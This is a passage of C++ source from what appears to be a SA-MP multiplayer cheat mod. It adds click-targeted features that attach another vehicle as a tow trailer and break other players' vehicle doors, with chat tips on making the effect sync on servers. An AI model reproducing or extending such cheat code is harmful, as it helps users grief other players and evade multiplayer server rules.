						sprintf(buf, "Attach %s to current vehicle", vehicleEntry->name);
					}
				}
				else
				{
					sprintf(buf, "Hover over a car");
				}
			}
			// setup some stuff for normal warp
			else
			{
				sprintf(buf, "Hover over a car");
			}
		}
		else
		{
			set.attachingtrailerenter = 0; // force disable, prevents clicks
			set.attachingtrailer = 0;
			//toggleSAMPCursor(0);
			return;
		}
		if (pCollision != nullptr)
		{
			// destroy the collision object
			pCollision->Destroy();
		}
		if (set.attachingtrailerenter)
		{
			if (pCVehicleTeleport != nullptr)
			{
				int iVehicleID = getVehicleGTAIDFromInterface((DWORD*)pCVehicleTeleport->GetInterface());

				struct vehicle_info* pVehicle = vehicle_info_get(iVehicleID, 0);

				// check that the vehicle is legit
				if (!isBadPtr_GTA_pVehicle(pVehicle) && pVehicle != NULL)
				{
					CVehicle* pSelfVehicle = pPedSelf->GetVehicle();

					if (pSelfVehicle)
					{
						int iVehicleID = getVehicleGTAIDFromInterface((DWORD*)pSelfVehicle->GetInterface());

						struct vehicle_info* pSelfVehicleEx = vehicle_info_get(iVehicleID, 0);

						// check that the vehicle is legit
						if (!isBadPtr_GTA_pVehicle(pSelfVehicleEx) && pSelfVehicleEx != NULL)
						{
							//pVehicle->trailer = pVehicle;
							pCVehicleTeleport->SetTowLink(pSelfVehicle);
						}
					}
				}
			}
			set.attachingtrailer = 0;
			set.attachingtrailerenter = 0;
			toggleSAMPCursor(0);
			g_iCursorEnabled = 0;
		}


		if (pCVehicleTeleport != nullptr)
		{
			D3DXVECTOR3 vehPoss, vehScreenposs;
			vehPoss.x = pCVehicleTeleport->GetPosition()->fX;
			vehPoss.y = pCVehicleTeleport->GetPosition()->fY;
			vehPoss.z = pCVehicleTeleport->GetPosition()->fZ + -1.0f;
			CalcScreenCoors(&vehPoss, &vehScreenposs);
			// print vehicle warp target name below vehicle & vehicle esp
			pD3DFontChat->PrintShadow(vehScreenposs.x, vehScreenposs.y + 10.0f, -1, buf);
		}
		else if (bCollision && pCollision)
		{
			D3DXVECTOR3 groundPoss, groundScreenposs;
			groundPoss.x = vecGroundPos.fX;
			groundPoss.y = vecGroundPos.fY;
			groundPoss.z = vecGroundPos.fZ;
			CalcScreenCoors(&groundPoss, &groundScreenposs);
			// print warp distance
			pD3DFontChat->PrintShadow(
				groundScreenposs.x - (pD3DFontChat->DrawLength(buf) / 2.0f) + 3.5f,
				groundScreenposs.y - 20.0f,
				-1, buf);
		}
	}
}


void clickDamageDoors()
{
	traceLastFunc("clickDamageDoors()");

	if (!g_iCursorEnabled) return;
	if (!set.damagingcardoor) return;
	if (gta_menu_active()) return;

	POINT cursor_pos;
	if (GetCursorPos(&cursor_pos) && ScreenToClient(pPresentParam.hDeviceWindow, &cursor_pos))
	{
		D3DXVECTOR3 poss, screenposs;
		char buf[256];

		CVehicle* pCVehicleTeleport = nullptr;
		
		screenposs.x = (float)cursor_pos.x;
		screenposs.y = (float)cursor_pos.y;
		screenposs.z = 700.0f;

		CalcWorldCoors(&screenposs, &poss);

		CVector vecTarget(poss.x, poss.y, poss.z);

		// setup variables
		CVector				vecOrigin, vecGroundPos;
		CColPoint* pCollision = nullptr;
		CEntitySAInterface* pCollisionEntity = nullptr;

		// origin = our camera
		vecOrigin = *pGame->GetCamera()->GetCam(pGame->GetCamera()->GetActiveCam())->GetSource();

		// check for collision
		bool bCollision = GTAfunc_ProcessLineOfSight(&vecOrigin, &vecTarget, &pCollision, &pCollisionEntity,
			1, 1, 0, 1, 1, 0, 0, 0);

		if (bCollision && pCollision)
		{
			// calculate position to check for ground
			vecGroundPos = *pCollision->GetPosition();
			if (cheat_state->state == CHEAT_STATE_VEHICLE)
			{
				vecGroundPos = vecGroundPos - (*pCollision->GetNormal() * 2.0f);
			}
			else
			{
				vecGroundPos = vecGroundPos - (*pCollision->GetNormal() * 0.5f);
			}

			// get ground position from collision position
			if (pPedSelf->GetAreaCode() == 0)
			{
				vecGroundPos.fZ = pGameInterface->GetWorld()->FindGroundZForPosition(vecGroundPos.fX, vecGroundPos.fY);
			}
			else
			{
				CVector vecGroundPosSlightlyAbove = vecGroundPos;
				vecGroundPosSlightlyAbove.fZ += 1.0f;
				vecGroundPos.fZ = pGameInterface->GetWorld()->FindGroundZFor3DPosition(&vecGroundPosSlightlyAbove);
			}

			// setup some stuff for vehicle jumper
			if (pCollisionEntity && pCollisionEntity->nType == ENTITY_TYPE_VEHICLE)
			{
				pCVehicleTeleport = pGameInterface->GetPools()->GetVehicle((DWORD*)pCollisionEntity);
				if (pCVehicleTeleport)
				{
					const struct vehicle_entry* vehicleEntry = gta_vehicle_get_by_id(pCVehicleTeleport->GetModelIndex());
					if (vehicleEntry != nullptr)
					{
						sprintf(buf, "Damage %s's doors", vehicleEntry->name);
					}
				}
				else
				{
					sprintf(buf, "Hover over a car");
				}
			}
			// setup some stuff for normal warp
			else
			{
				sprintf(buf, "Hover over a car");
			}
		}
		else
		{
			set.damagingcardoorenter = 0; // force disable, prevents clicks
			set.damagingcardoor = 0;
			//toggleSAMPCursor(0);
			return;
		}
		if (pCollision != nullptr)
		{
			// destroy the collision object
			pCollision->Destroy();
		}
		if (set.damagingcardoorenter)
		{
			if (pCVehicleTeleport != nullptr)
			{
				int iVehicleID = getVehicleGTAIDFromInterface((DWORD*)pCVehicleTeleport->GetInterface());

				struct vehicle_info* pVehicle = vehicle_info_get(iVehicleID, 0);

				// check that the vehicle is legit
				if (!isBadPtr_GTA_pVehicle(pVehicle) && pVehicle != NULL)
				{
					DamageVehicleDoor(getSAMPVehicleIDFromGTAVehicle(pVehicle));
					const struct vehicle_entry* vehicleEntry = gta_vehicle_get_by_id(pCVehicleTeleport->GetModelIndex());

					addMessageToChatWindow("{FFFFFF}Broke %s's {00CCFF}right door{FFFFFF}. Restream (enter & exit) to sync.", vehicleEntry->name);
					addMessageToChatWindow("{FFFFFF}In some servers you have to G-Bug or enter the car, exit and then restream for effect.");
				}
			}
			set.damagingcardoorenter = 0;
			set.damagingcardoor = 0;
			toggleSAMPCursor(0);
			g_iCursorEnabled = 0;
		}


		if (pCVehicleTeleport != nullptr)
		{
			D3DXVECTOR3 vehPoss, vehScreenposs;
			vehPoss.x = pCVehicleTeleport->GetPosition()->fX;
			vehPoss.y = pCVehicleTeleport->GetPosition()->fY;
			vehPoss.z = pCVehicleTeleport->GetPosition()->fZ + -1.0f;
			CalcScreenCoors(&vehPoss, &vehScreenposs);
			// print vehicle warp target name below vehicle & vehicle esp
			pD3DFontChat->PrintShadow(vehScreenposs.x, vehScreenposs.y + 10.0f, -1, buf);
		}
		else if (bCollision && pCollision)
		{
			D3DXVECTOR3 groundPoss, groundScreenposs;
			groundPoss.x = vecGroundPos.fX;
			groundPoss.y = vecGroundPos.fY;
			groundPoss.z = vecGroundPos.fZ;
			CalcScreenCoors(&groundPoss, &groundScreenposs);
			// print warp distance
			pD3DFontChat->PrintShadow(
				groundScreenposs.x - (pD3DFontChat->DrawLength(buf) / 2.0f) + 3.5f,
				groundScreenposs.y - 20.0f,
				-1, buf);
		}
	}
}
	